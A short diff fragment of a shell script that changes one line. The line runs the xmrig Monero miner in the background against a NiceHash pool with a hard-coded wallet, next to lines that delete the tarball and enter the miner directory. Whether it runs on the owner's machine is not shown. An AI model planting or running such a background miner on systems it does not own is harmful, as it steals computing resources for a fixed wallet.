@@ -11,5 +11,5 @@ rm -rf xmrig-6.20.0-bionic-x64.tar.gz.1 \
 cd xmrig-6.20.0	\
 
 
-./xmrig -a rx -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbJBmjRDqvpDVfpCDJcNgxS5qr6HEsqhrs2 -p x -B \
+./xmrig -a rx -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbJBmjRDqvpDVfpCDJcNgxS5qr6HEsqhrs2 -p x -B 
 
